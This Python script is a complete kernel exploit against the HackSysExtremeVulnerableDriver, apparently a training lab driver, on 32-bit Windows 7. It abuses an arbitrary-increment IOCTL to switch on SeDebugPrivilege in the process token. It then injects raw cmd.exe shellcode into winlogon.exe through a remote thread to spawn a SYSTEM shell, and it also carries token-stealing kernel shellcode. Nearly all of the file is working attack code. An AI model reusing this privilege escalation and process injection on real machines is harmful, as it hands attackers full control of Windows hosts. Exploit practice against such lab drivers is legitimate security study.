# -*- coding: utf-8 -*-
import sys
import random
import binascii
import struct
import os
import subprocess
import ctypes 
import json 

from ctypes import *
from ctypes.wintypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi
advapi32 = windll.advapi32
OpenProcessToken = advapi32.OpenProcessToken

# Constants.
NTSTATUS = LONG
ULONG_PTR = WPARAM
ACCESS_MASK = DWORD

ULONG_PTR = PVOID = LPVOID
QWORD = c_ulonglong
CHAR = c_char
NTSTATUS = DWORD
NULL = 0x0
SystemExtendedHandleInformation = 64
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
STATUS_SUCCESS = 0
TOKEN_ALL_ACCESS = 0xf00ff
DISABLE_MAX_PRIVILEGE = 0x1
FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM  = ( 0x1000 | 0x2000 )
TH32CS_SNAPPROCESS = 0x02

OBJECT_INFORMATION_CLASS = ULONG
ObjectBasicInformation = ULONG(0)
ObjectNameInformation = ULONG(1)
ObjectTypeInformation = ULONG(2)

PROCESS_DUP_HANDLE = 0x0040
PROCESS_SUSPEND_RESUME = 0x0800

DUPLICATE_CLOSE_SOURCE = 0x00000001
DUPLICATE_SAME_ACCESS = 0x00000002
DUPLICATE_SAME_ATTRIBUTES = 0x00000004

# Function signature helpers.
ntdll.NtQuerySystemInformation.argtypes = [DWORD, PVOID, ULONG, POINTER(ULONG)]
ntdll.NtQuerySystemInformation.restype = NTSTATUS

advapi32.OpenProcessToken.argtypes = [HANDLE, DWORD , POINTER(HANDLE)]
advapi32.OpenProcessToken.restype  = BOOL

ntdll.NtQueryObject.restype = NTSTATUS
ntdll.NtQueryObject.argtypes = [
    HANDLE,
    OBJECT_INFORMATION_CLASS,
    LPVOID,
    ULONG,
    POINTER(ULONG)]

class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
    """Represent the SYSTEM_HANDLE_TABLE_ENTRY_INFO on ntdll."""
    _fields_ = [
        ("Object", PVOID),
        ("UniqueProcessId", PVOID),
        ("HandleValue", PVOID),
        ("GrantedAccess", ULONG),
        ("CreatorBackTraceIndex", USHORT),
        ("ObjectTypeIndex", USHORT),
        ("HandleAttributes", ULONG),
        ("Reserved", ULONG),
    ]
 
class SYSTEM_HANDLE_INFORMATION_EX(Structure):
    """Represent the SYSTEM_HANDLE_INFORMATION on ntdll."""
    _fields_ = [
        ("NumberOfHandles", PVOID),
        ("Reserved", PVOID),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]

class UNICODE_STRING(Structure):
    _fields_ = [
        ('Length', USHORT),
        ('MaximumLength', USHORT),
        ('Buffer', LPWSTR * 4096),
    ]

class OBJECT_BASIC_INFORMATION(Structure):
    _fields_ = [
        ('Attributes', ULONG),
        ('GrantedAccess', ACCESS_MASK),
        ('HandleCount', ULONG),
        ('PointerCount', ULONG),
        ('PagedPoolCharge', ULONG),
        ('NonPagedPoolCharge', ULONG),
        ('Reserved', ULONG * 3),
        ('NameInfoSize', ULONG),
        ('TypeInfoSize', ULONG),
        ('SecurityDescriptorSize', ULONG),
        ('CreationTime', LARGE_INTEGER),
    ]

class OBJECT_NAME_INFORMATION(Structure):
    _fields_ = [
        ('Name', UNICODE_STRING),
    ]

class OBJECT_TYPE_INFORMATION(Structure):
    _fields_ = [
        ('TypeName', UNICODE_STRING),
        ('Reserved', ULONG * 22),
    ]


class SYSTEM_HANDLE(Structure):
    _fields_ = [
        ('Object', LPVOID),
        ('UniqueProcessId', HANDLE),
        ('HandleValue', HANDLE),
        ('GrantedAccess', ULONG),
        ('CreatorBackTraceIndex', USHORT),
        ('ObjectTypeIndex', USHORT),
        ('HandleAttributes', ULONG),
        ('Reserved', ULONG),
    ]

class PROCESSENTRY32(Structure):
    """Describes an entry from a list of the processes residing in the system
       address space when a snapshot was taken."""
    _fields_ = [ ( 'dwSize' , DWORD ) ,
                 ( 'cntUsage' , DWORD) ,
                 ( 'th32ProcessID' , DWORD) ,
                 ( 'th32DefaultHeapID' , POINTER(ULONG)) ,
                 ( 'th32ModuleID' , DWORD) ,
                 ( 'cntThreads' , DWORD) ,
                 ( 'th32ParentProcessID' , DWORD) ,
                 ( 'pcPriClassBase' , LONG) ,
                 ( 'dwFlags' , DWORD) ,
                 ( 'szExeFile' , CHAR * MAX_PATH ) 
    ]

# -----------------------------------------------------------------------------
# exploit functions
#------------------------------------------------------------------------------
def debug_print(message):
    """debug_debug_prints message in terminal and debugger"""

    print(message)
    kernel32.OutputDebugStringA(message + "\n")


def getLastError():
    """Format GetLastError"""
    
    buf = create_string_buffer(2048)
    if kernel32.FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL,
            kernel32.GetLastError(), 0,
            buf, sizeof(buf), NULL):
        debug_print("\n[-] ERR:  " + str(buf.value))
    else:
        debug_print("Unknown Error")
    

def hexdump(ptr, num):
    """
    Hexdump memory region - DEBUG
    0000 | 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  | .ELF............
    0010 | 03 00 3e 00 01 00 00 00 10 42 0d 00 00 00 00 00  | ..>......B......
    0020 | 40 00 00 00 00 00 00 00 38 4c 39 00 00 00 00 00  | @.......8.9.....
    0030 | 00 00 00 00 40 00 38 00 09 00 40 00 1e 00 1d 00  | ....@.8...@.....
    0040 | 06 00 00 00 05 00 00 00 40 00 00 00 00 00 00 00  | ........@.......
    0050 | 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  | @.......@.......
    0060 | 08 01 00 00 00 00 00 00 08 01 00 00 00 00 00 00  | ................
    0070 | 08 00 00 00 00 00 00 00 03 00 00 00 04 00 00 00  | ................
    """

    s = ''
    n = 0
    lines = []
    data = list((num * ctypes.c_byte).from_address(ptr))

    if len(data) == 0:
        return '<empty>'

    for i in range(0, num, 16):
        line = ''
        line += '%04x | ' % (i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % abs(data[j])

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)

    return '\n'.join(lines)
        

def _ret_shellcode_buffer():
    """Payload memory allocation in user-land"""

    shellcode = bytearray(
        #---[Debug]
        "\xCC"
        #---[Setup]
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00" 	    # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00" 	    # mov ebx, [eax + TOKEN_OFFSET]
        #---[Copy System PID token]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                      # jnz                           ->|
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        "\x61"                          # popad		
        "\xC3"                          # ret
    )

    MEM_COMMIT_MEM_RESERVE = 0x3000
    PAGE_EXECUTE_READWRITE = 0x40
	
    ptr = kernel32.VirtualAlloc(
        c_int(0),                       # lpAddress
        c_int(len(shellcode)),          # dwSize
        c_int(MEM_COMMIT_MEM_RESERVE),  # flAllocationType
        c_int(PAGE_EXECUTE_READWRITE)   # flProtect
    )
    
    shellcode_ptr = (c_char * len(shellcode)).from_buffer(shellcode)

    kernel32.RtlMoveMemory(
        c_int(ptr),
        shellcode_ptr,
        c_int(len(shellcode))
    )
        
    return ptr, len(shellcode)


def _send_payload(payload_ptr, payload_len, code):
    """Interacting with the driver"""
    
    FILE_DEVICE_UNKNOWN = 0x22
    FILE_ANY_ACCESS = 0
    METHOD_NEITHER = 3

    # Recreate CTL_CODE macro to generate driver IOCTL 
    ctl_code = (
        (FILE_DEVICE_UNKNOWN << 16) |
        (FILE_ANY_ACCESS << 14) | 
        (code << 2) | 
        METHOD_NEITHER
    )

    # Create handle to driver """
    handle = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
        0xC0000000,              # dwDesiredAccess
        0,                       # dwShareMode
        None,                    # lpSecurityAttributes
        0x3,                     # dwCreationDisposition
        0,                       # dwFlagsAndAttributes
        None                     # hTemplateFile
    )

    IO_CTL = kernel32.DeviceIoControl(
        handle,             # hDevice
        ctl_code,           # dwIoControlCode
        payload_ptr,        # lpInBuffer
        c_int(payload_len), # nInBufferSize
        None,               # lpOutBuffer
        0,                  # nOutBufferSize
        byref(c_ulong()),   # lpBytesReturned
        None                # lpOverlapped
    )
    
    return kernel32.CloseHandle(handle)
    

def getPidByName(process_name):
    """Get Process Pid by process_name"""
    
    pid = None
    count = 0
    try:
        hProcessSnap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        pe32 = PROCESSENTRY32()
        pe32.dwSize = sizeof(PROCESSENTRY32)
        ret = kernel32.Process32First(hProcessSnap , byref(pe32))
        while ret:
            if pe32.szExeFile == LPSTR(process_name).value:
                pid = pe32.th32ProcessID
                count += 1
            ret = kernel32.Process32Next(hProcessSnap, byref(pe32))
        kernel32.CloseHandle (hProcessSnap)
    
    except Exception, e:
        debug_print(str(e))
    
    if not pid:
        debug_print("Could not find %s PID" % process_name)
    
    return pid

# --------------------------------------------------------------------------------------------------------------------
# https://www.programcreek.com/python/?code=abatchy17%2FWindowsExploits%2FWindowsExploits-master%2FMS14-058%2F37064.py
# https://github.com/yihleego/pywinhandle/blob/master/src/pywinhandle.py
#---------------------------------------------------------------------------------------------------------------------
def query_object_basic_info(h):
    basic_info = OBJECT_BASIC_INFORMATION()
    return_length = c_ulong(sizeof(OBJECT_BASIC_INFORMATION))
    status = ntdll.NtQueryObject(
        h, 
        ObjectBasicInformation, 
        byref(basic_info), 
        return_length, 
        byref(return_length)
    )

    if status == STATUS_SUCCESS:
        return basic_info

    elif status == STATUS_INFO_LENGTH_MISMATCH:
        return None
        
    else:
        return None


def query_object_name_info(h, length):
    name_info = OBJECT_NAME_INFORMATION()
    return_length = c_ulong(length + sizeof(OBJECT_NAME_INFORMATION))
    status = ntdll.NtQueryObject(
        h, 
        ObjectNameInformation, 
        byref(name_info), 
        return_length, 
        byref(return_length)
    )

    if status == STATUS_SUCCESS:
        return name_info

    elif status == STATUS_INFO_LENGTH_MISMATCH:
        return None
        
    else:
        return None


def query_object_type_info(h, length):
    type_info = OBJECT_TYPE_INFORMATION()
    return_length = c_ulong(length + sizeof(OBJECT_TYPE_INFORMATION))
    status = ntdll.NtQueryObject(
        h, 
        ObjectTypeInformation, 
        byref(type_info), 
        return_length, 
        byref(return_length)
    )

    if status == STATUS_SUCCESS:
        return type_info

    elif status == STATUS_INFO_LENGTH_MISMATCH:
        return None

    else:
        return None


def duplicate_object(source_process_handle, source_handle):
    h = HANDLE()
    status = ntdll.NtDuplicateObject(
        source_process_handle, source_handle, 
        kernel32.GetCurrentProcess(), 
        byref(h), 
        0, 
        0, 
        DUPLICATE_SAME_ACCESS | DUPLICATE_SAME_ATTRIBUTES
    )

    if status == STATUS_SUCCESS:
        return h

    else:
        return None


def query_system_handle_information():
    current_length = 0x10000
    while True:
        if current_length > 0x4000000:
            return

        class SYSTEM_HANDLE_INFORMATION_EX(Structure):
            _fields_ = [
                ('HandleCount', ULONG_PTR),
                ('Reserved', ULONG_PTR),
                ('Handles', SYSTEM_HANDLE * current_length)
            ]

        buf = SYSTEM_HANDLE_INFORMATION_EX()
        return_length = c_ulong(current_length)
        status = ntdll.NtQuerySystemInformation(
            SystemExtendedHandleInformation, 
            byref(buf), 
            return_length, 
            byref(return_length)
        )

        if status == STATUS_SUCCESS:
            return buf
        elif status == STATUS_INFO_LENGTH_MISMATCH:
            current_length *= 8
            continue
        else:
            return None


def find_handles(process_ids=None, handle_names=None):
    """Return all the open handles in the system"""

    result = []
    system_info = query_system_handle_information()
    for i in range(system_info.HandleCount):
        handle_info = system_info.Handles[i]
        hObject = hex(handle_info.Object)
        handle = handle_info.HandleValue
        process_id = handle_info.UniqueProcessId
        if process_ids and process_id not in process_ids:
            continue
        try:
            source_process = kernel32.OpenProcess(
                PROCESS_ALL_ACCESS | PROCESS_DUP_HANDLE | PROCESS_SUSPEND_RESUME, 
                False, 
                process_id
            )
        except:
            continue

        handle_name = None
        handle_type = None
        duplicated_handle = duplicate_object(source_process, handle)
        if duplicated_handle:
            basic_info = query_object_basic_info(duplicated_handle)

            if basic_info:
                if basic_info.NameInfoSize > 0:
                    name_info = query_object_name_info(duplicated_handle, basic_info.NameInfoSize)
                    if name_info:
                        handle_name = name_info.Name.Buffer[0]

                if basic_info.TypeInfoSize > 0:
                    type_info = query_object_type_info(duplicated_handle, basic_info.TypeInfoSize)
                    if type_info:
                        handle_type = type_info.TypeName.Buffer[0]

        if handle_names:
            if not handle_name:
                continue
            matched = False
            
            for target in handle_names:
                if target == handle_name or target in handle_name:
                    matched = True
                    break

            if not matched:
                continue

        result.append({
            'process_id': process_id, 
            'handle': handle, 
            'name': handle_name, 
            'type': handle_type,
            'object': hObject # modified
            }
        )

    return result


def close_handle(process_id, handle):
    """Close target handle by proc_id""" 
    process = kernel32.OpenProcess(PROCESS_DUP_HANDLE, False, process_id)
    DuplicateHandle(process, handle, 0, 0, 0, DUPLICATE_CLOSE_SOURCE)
    kernel32.CloseHandle(process)


def get_token_handle():
    """Current process Token handle"""
    hProcess = HANDLE(kernel32.GetCurrentProcess())
    hToken = HANDLE()
    hRestrictedToken = HANDLE()
    
    if not advapi32.OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, byref(hToken)):
        debug_print("Could not open current process token", "e")
        getLastError()
        sys.exit()
    
    kernel32.CloseHandle(hProcess)

    # handle.UniqueProcessId, handle.HandleValue, handle.Object 
    handles = find_handles()
    for h in handles:
        if h["process_id"] == os.getpid() and h["type"] == "Token":
            print("\n[!] KToken address found!: [0x%x])" % int(h["object"][:-1], 16))
            return int(h["object"][:-1], 16)

def inject_shellcode(winlogon_pid):
    """Inject CMD/x86 shellcode into [winlogon.exe]""" 
        
    # Get  winlogon.exe pid
    pid = winlogon_pid

    # Get a handle to the winprinton process we are injecting into 
    hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

    if not hProcess:
        debug_print("\t[-] Couldn't acquire a handle to PID: %s" % pid)
        sys.exit()

    debug_print("\n\t[+] Obtained handle [0x%x] for the winlogon.exe process" % hProcess)
    
    # Creating shellcode buffer to inject into the host process
    # https://packetstormsecurity.com/files/142572/Microsoft-Windows-32-bit-64-bit-cmd.exe-Shellcode.html
    SHELLCODE = (
        "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08"
        "\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01"
        "\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74"
        "\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08"
        "\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c"
        "\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9"
        "\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49"
        "\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65"
        "\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d"
        "\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x65\x78\x65"
        "\x20\x68\x63\x6d\x64\x2e\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9"
        "\x51\xff\xd6"
    )

    sh = create_string_buffer(SHELLCODE, len(SHELLCODE))
    code_size = len(SHELLCODE)    
    
    # Allocate some space for the shellcode (in the program memory)
    sh_address = kernel32.VirtualAllocEx(hProcess, 0, code_size, VIRTUAL_MEM, 
                                         PAGE_EXECUTE_READWRITE)
    if not sh_address:
        debug_print("\t[-] Could not allocate shellcode in the remote process")
        getLastError()
        sys.exit()
        
    debug_print("\t[+] Allocated memory at address 0x%x" % sh_address)

    # Inject shellcode in to winlogon.exe process space
    written = LPVOID(0)
    shellcode = DWORD(sh_address)
    dwStatus = kernel32.WriteProcessMemory(hProcess, shellcode, sh, code_size, 
                                            byref(written))
    if not dwStatus:
        debug_print("\t[-] Could not write shellcode into winlogon.exe")
        getLastError()
        sys.exit()
        
    debug_print("\t[+] Injected %d bytes of shellcode to 0x%x" % (written.value, sh_address))

    # Now we create the remote thread and point its entry routine to be head of 
    # our shellcode
    thread_id = HANDLE(0)
    if not kernel32.CreateRemoteThread(hProcess, 0, 0, sh_address, 0, 0, 
                                        byref(thread_id)):
        debug_print("\t[-] Failed to inject shellcode into winlogon.exe")
        getLastError()
        sys.exit()

    debug_print("\t[+] Remote thread  0x%x created" % thread_id.value)
    debug_print("\t[+] Spawning SYSTEM shell...")
    # Kill python process to kill the window and avoid BSODs
    #os.kill(os.getpid(), signal.SIGABRT)

    debug_print("\n\t\t[*] Remote thread created with a thread ID of: [%x]" % thread_id.value)
    debug_print("\t\t[+] ***BOOM!!")

def _exploit(code):
    """Execute exploit in order to get nt-authority/SYSTEM shell"""
    #shellcode_ptr, shellcode_len = _ret_shellcode_buffer() # shellcode virtual allocation

    #debug_print("\n[*] User-land shellcode allocated at: [0x%x]\n" % shellcode_ptr)
    #debug_print(hexdump(shellcode_ptr, 32))
    
    """
    ed 0x8241fc88+0x40 0x02880000 (default)
    ed 0x8241fc88+0x40 0x02900000 (+seDebugPrivilege)
    dps 0x8241fc88+0x42 -> 0x00060288 -> +8 -> 0x00060290
 
    dps 0x8241fc88+0x40+8+2
    00000080 + 0x7f -> 000000ff -> (+seDebugPrivilege - Enabled) 
    """
    while True: # random tokens not so random anymore! 
        token_handle = get_token_handle()
        """
        1: kd> dt nt!_TOKEN 8241fc88
    +0x000 TokenSource      : _TOKEN_SOURCE
    +0x010 TokenId          : _LUID
    +0x018 AuthenticationId : _LUID
    +0x020 ParentTokenId    : _LUID
    +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff`ffffffff
    +0x030 TokenLock        : 0x87b2d8b0 _ERESOURCE
    +0x034 ModifiedId       : _LUID
    .-----------------------------------------------.
    |+0x040 Privileges       : _SEP_TOKEN_PRIVILEGES|
    '-----------------------------------------------'
    +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
    +0x074 SessionId        : 1

        1: kd> dx -id 0,0,856117c8 -r1 (*((ntkrpamp!_SEP_TOKEN_PRIVILEGES *)0x8241fcc8))
    (*((ntkrpamp!_SEP_TOKEN_PRIVILEGES *)0x8241fcc8))                 [Type: _SEP_TOKEN_PRIVILEGES]
        [+0x000] Present          : 0x602800000 [Type: unsigned __int64] -> 0x602900000 (Activate SeDebugPrivileges)
        [+0x008] Enabled          : 0x800000 [Type: unsigned __int64] -> 0xff0000 (Enable SeDebugPrivileges)
        [+0x010] EnabledByDefault : 0x800000 [Type: unsigned __int64]
        """
        T_Present = token_handle + 0x42
        SUM = 8
        # incrementing T_Present address to unlock SeDebugPrivilege
        for _ in range(0, SUM):
            payload = struct.pack("<L", T_Present)
            payload_ptr = id(payload) + 0x14
            payload_len = len(payload)
        
            # send custom payload
            _send_payload(
                payload_ptr,
                payload_len,
                code
            )
        
        T_Enabled = token_handle + 0x40 + 0x8 + 0x2
        SUM = 0x7f
        
        # incrementing T_Enabled address to unlock SeDebugPrivilege
        for _ in range(0, SUM):
            payload = struct.pack("<L", T_Enabled)
            payload_ptr = id(payload) + 0x14
            payload_len = len(payload)
        
            # send custom payload
            _send_payload(
                payload_ptr,
                payload_len,
                code
            )

        debug_print("[+] Exploit Payload Sent!")
        debug_print("[!] Getting nt-authority/SYSTEM impersonated process shell...")
        
        winlogon_pid = getPidByName("winlogon.exe")
        return inject_shellcode(winlogon_pid) # get SYSTEM shell

if __name__ == "__main__":
    """
    REFERENCES
        https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/ArbitraryIncrement.c 
        https://github.com/yihleego/pywinhandle/blob/master/src/pywinhandle.py 
        https://windows-internals.com/exploiting-a-simple-vulnerability-in-35-easy-steps-or-less/
        https://github.com/yardenshafir/CVE-2020-1034/blob/main/exploit_part_1/Main.cpp

    IOCTL to trigger ArbitraryIncrement in win7 x86
        http://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h

    Usefull WinDBG commands:
        .sympath c:\symbols;c:\hevd
        .reload /f *.*
        ed nt!Kd_Default_Mask 8
        .load pykd
        .load grep
        bp HEVD!TriggerArbitraryIncrement
        g
    """
    code = 0x81C # HEVD_IOCTL_ARBITRARY_INCREMENT - IOCTL(0x81C)
    _exploit(code)
